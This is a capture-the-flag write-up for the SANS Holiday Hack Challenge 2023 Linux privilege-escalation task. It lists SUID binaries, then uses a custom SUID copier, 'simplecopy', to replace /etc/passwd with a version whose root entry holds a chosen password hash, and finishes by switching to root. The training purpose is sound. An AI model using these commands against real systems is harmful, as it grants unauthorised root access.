# SANS Holiday Hack Challenge 2023 - Linux PrivEsc

## Description

> Rosemold is in Ostrich Saloon on the Island of Misfit Toys. Give her a hand with escalation for a tip about hidden islands.

### Metadata

- Difficulty: 3/5
- Tags: `linux`, `cli`, `privesc`

## Solution

### Video

<iframe width="1280" height="720" src="https://youtu.be/LtHHYrNxOEw?t=635" title="SANS Holiday Hack Challenge 2023 - Linux Privesc" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

### Write-up

We get a simulated bash shell as `elf` user and our task is to escalate privileges to `root` and execute a binary in the `/root/` directory.

A typical Linux privilege escalation possibility is by finding a binary with the SETUID bit set, which means that if the binary is executed by anyone, it will run with as the owner. If the owner is `root` then it will be executed as `root`.

```shell
elf@3a9c01b680bd:~$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
-rwsr-xr-x 1 root root 85064 Nov 29  2022 /usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Nov 29  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 55528 May 30  2023 /usr/bin/mount
-rwsr-xr-x 1 root root 44784 Nov 29  2022 /usr/bin/newgrp
-rwsr-xr-x 1 root root 67816 May 30  2023 /usr/bin/su
-rwsr-xr-x 1 root root 88464 Nov 29  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39144 May 30  2023 /usr/bin/umount
-rwsr-xr-x 1 root root 68208 Nov 29  2022 /usr/bin/passwd
-rwsr-xr-x 1 root root 16952 Dec  2 22:17 /usr/bin/simplecopy
```

There is an interesting, uncommon binary: `/usr/bin/simplecopy`. With this binary we can copy files as `root` (this means rewriting too).

```shell
elf@3a9c01b680bd:~$ /usr/bin/simplecopy
Usage: /usr/bin/simplecopy <source> <destination>
```

Let's try to rewrite the original `/etc/passwd` file with a modified one where the password of the `root` user is set by us.

Let's create a password hash first.

```shell
$ openssl passwd -1 abcd1234
$1$aaKSCbOa$9xFvoWBfi3.1PjpX4vmub0
```

Copy the original `passwd` file and modify the first line so that it will contain the password hash.

```shell
elf@3a9c01b680bd:~$ /usr/bin/simplecopy /etc/passwd passwd

elf@3a9c01b680bd:~$ sed '0,/x/s//\$1\$aaKSCbOa$9xFvoWBfi3.1PjpX4vmub0/' passwd > new_passwd 

elf@3a9c01b680bd:~$ cat new_passwd 
root:$1$aaKSCbOa$9xFvoWBfi3.1PjpX4vmub0:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
elf:x:1000:1000::/home/elf:/bin/sh
```

Now, let's copy the modified `passwd` file and rewrite the original one.

```shell
elf@3a9c01b680bd:~$ /usr/bin/simplecopy new_passwd /etc/passwd
```

Now we know the `root` password and we can solve the challenge.

```shell
elf@3a9c01b680bd:~$ su root
Password: 
root@3a9c01b680bd:/home/elf# cd /root/
root@3a9c01b680bd:~# ls
runmetoanswer
root@3a9c01b680bd:~# ./runmetoanswer 
Who delivers Christmas presents?

> santa
Your answer: santa

Checking....
Your answer is correct!
```

> **Rose Mold (Ostrich Saloon)**:
*Yup, I knew you knew. You just have that vibe.
To answer your question of why from earlier... Nunya!
But, I will tell you something better, about some information I... found.
There's a hidden, uncharted area somewhere along the coast of this island, and there may be more around the other islands.
The area is supposed to have something on it that's totes worth, but I hear all the bad vibe toys chill there.
That's all I got. K byyeeeee.
Ugh... n00bs...*